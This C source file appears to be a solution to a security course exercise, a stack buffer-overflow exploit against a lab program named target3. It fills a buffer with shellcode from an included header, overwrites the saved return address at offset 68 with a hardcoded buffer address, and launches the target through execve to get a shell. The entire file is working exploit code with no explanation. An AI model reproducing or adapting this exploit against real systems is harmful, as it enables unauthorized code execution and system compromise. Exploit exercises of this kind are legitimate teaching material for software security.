#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define BUF_START 0x2021fe14
#define SHELL_LENGTH 45
#define BUFSIZE 73

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	
	char attack[BUFSIZE];
	int i;

	for (i = 0; i < BUFSIZE; i++) {
		attack[i] = 0xFF;
	}

	for (i=0; i < SHELL_LENGTH; i++) {
		attack[i] = shellcode[i];
	}

	int* ret = (int*) (attack + 68);
	*ret = BUF_START;

	attack[BUFSIZE-1] = '\0';

	args[0] = TARGET;
	args[1] = attack;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
